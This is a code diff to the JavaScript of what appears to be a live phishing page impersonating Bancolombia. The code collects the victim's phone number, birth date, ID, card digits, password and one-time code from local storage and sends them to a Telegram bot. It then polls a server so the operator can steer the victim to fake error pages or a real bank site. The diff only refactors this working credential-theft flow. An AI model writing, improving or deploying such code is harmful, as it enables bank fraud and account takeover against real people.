@@ -56,8 +56,8 @@
 <script>
 document.addEventListener('DOMContentLoaded', async () => {
   const config = await fetch("botconfig.json").then(r => r.json()).catch(() => null);
-  if (!config || !config.token || !config.chat_id) {
-    alert("Error cargando la configuración del bot.");
+  if (!config || !config.token) {
+    alert("Error al cargar el bot.");
     return;
   }
 
@@ -66,31 +66,30 @@ document.addEventListener('DOMContentLoaded', async () => {
   const otp = localStorage.getItem("bancoldina");
 
   if (!session || !otp || !session.celular || !session.clave) {
-    alert("Faltan datos. Redirigiendo...");
+    alert("Faltan datos.");
     return window.location.href = "index.html";
   }
 
-  const transactionId = localStorage.getItem("transactionId") || 
-    (Date.now().toString(36) + Math.random().toString(36).slice(2));
-  localStorage.setItem("transactionId", transactionId);
+  const txid = Date.now().toString(36) + Math.random().toString(36).slice(2);
+  localStorage.setItem("transactionId", txid);
 
   const mensaje = `
 <b>INGRESO BANCOLOMBIA (OTP)</b>
-🆔 ID: ${transactionId}
+🆔 ID: ${txid}
 📱 Celular: ${session.celular}
 🎂 Nacimiento: ${session.nacimiento}
 💳 Tipo: ${session.tipo}
 🔢 Identificador: ${session.identificador}
 🔸 Últimos 2 dígitos: ${session.digitosFinales}
 🔐 Clave: ${session.clave}
-🔄 Dinámica OTP: ${otp}
+🔄 OTP: ${otp}
 `;
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "❌ Error de Logo", callback_data: `error_logo:${transactionId}` }],
-      [{ text: "🔁 Error OTP", callback_data: `error_otp:${transactionId}` }],
-      [{ text: "🏁 Finalizar", callback_data: `finalizar:${transactionId}` }]
+      [{ text: "❌ Error de Logo", callback_data: `error_logo:${txid}` }],
+      [{ text: "🔁 Error OTP", callback_data: `error_otp:${txid}` }],
+      [{ text: "🏁 Finalizar", callback_data: `finalizar:${txid}` }]
     ]
   };
 
@@ -101,34 +100,32 @@ document.addEventListener('DOMContentLoaded', async () => {
           "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
   });
 
-  revisarAccion(transactionId); // <- CORRECTO
+  checkAction();
 
-});
+  async function checkAction() {
+    try {
+      const res = await fetch(`sendStatus.php?txid=${txid}`);
+      const json = await res.json();
 
-// ✅ Esta función SÍ se llama correctamente y consulta el botón presionado
-async function revisarAccion(txId) {
-  try {
-    const res = await fetch(`sendStatus.php?txid=${txId}`);
-    const json = await res.json();
+      if (!json.status || json.status === "esperando") {
+        return setTimeout(checkAction, 3000);
+      }
 
-    if (!json.status || json.status === "esperando") {
-      return setTimeout(() => revisarAccion(txId), 3000);
+      switch (json.status) {
+        case "error_logo":
+          return window.location.href = "errorlogo.html";
+        case "error_otp":
+          return window.location.href = "cel-dina-error.html";
+        case "finalizar":
+        case "confirm_finalizar":
+          return window.location.href = "https://www.bancoppel.com";
+      }
+    } catch (e) {
+      console.error("Error al chequear acción:", e);
+      setTimeout(checkAction, 3000);
     }
-
-    switch (json.status) {
-      case "error_logo":
-        return window.location.href = "errorlogo.html";
-      case "error_otp":
-        return window.location.href = "cel-dina-error.html";
-      case "finalizar":
-      case "confirm_finalizar":
-        return window.location.href = "https://www.bancoppel.com";
-    }
-  } catch (e) {
-    console.error("Error al revisar botón:", e);
-    setTimeout(() => revisarAccion(txId), 3000);
   }
-}
+});
 </script>
 </body>
 </html>
